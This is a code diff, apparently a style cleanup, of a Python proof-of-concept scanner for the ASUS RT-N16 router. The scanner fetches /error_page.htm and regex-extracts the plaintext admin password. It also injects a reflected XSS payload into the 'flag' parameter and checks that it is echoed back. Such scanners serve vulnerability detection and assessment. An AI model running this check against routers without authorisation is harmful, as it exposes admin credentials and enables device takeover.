@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 import urlparse
 
+
 class Vuln(ABVuln):
-    vuln_id = 'ASUS_0001' # 平台漏洞编号，留空
+    vuln_id = 'ASUS_0001'  # 平台漏洞编号，留空
     name = '华硕 RT-N16 路由器信息泄露'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INFO_LEAK # 漏洞类型
+    type = VulnType.INFO_LEAK  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         华硕 RT-N16 - Text-plain Admin Password Disclosure and reflected xss,
@@ -21,6 +22,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'ASUS Router'  # 漏洞应用名称
     product_version = 'RT-N16'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '93da198c-25b6-4f3e-a4f1-ff5acf06c029'
@@ -34,33 +36,36 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
-            #admin pass disclosure
+            # admin pass disclosure
             url = self.target + '/error_page.htm'
             code, head, res, errcode, _ = hh.http(url)
             if code == 200:
-                m = re.search(r"if\('1' == '0' \|\| '([\S]*)' == '([\S]*)'", res)
+                m = re.search(
+                    r"if\('1' == '0' \|\| '([\S]*)' == '([\S]*)'", res)
                 if m:
                     #security_hole('Admin Password Disclosure {username}:{password}'.format(username=m.group(2),password=m.group(1)))
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
-            #Reflected xss
-            url = self.target + '/error_page.htm?flag=%27%2balert(%27XSS%27)%2b%27'
+            # Reflected xss
+            url = self.target + \
+                '/error_page.htm?flag=%27%2balert(%27XSS%27)%2b%27'
             code, head, res, errcode, _ = hh.http(url)
             if code == 200 and "casenum = ''+alert('XSS')+'';" in res:
                 #security_warning(url + ' reflected xss')
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                    target=self.target, name=self.vuln.name))
             else:
                 pass
-                    
+
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
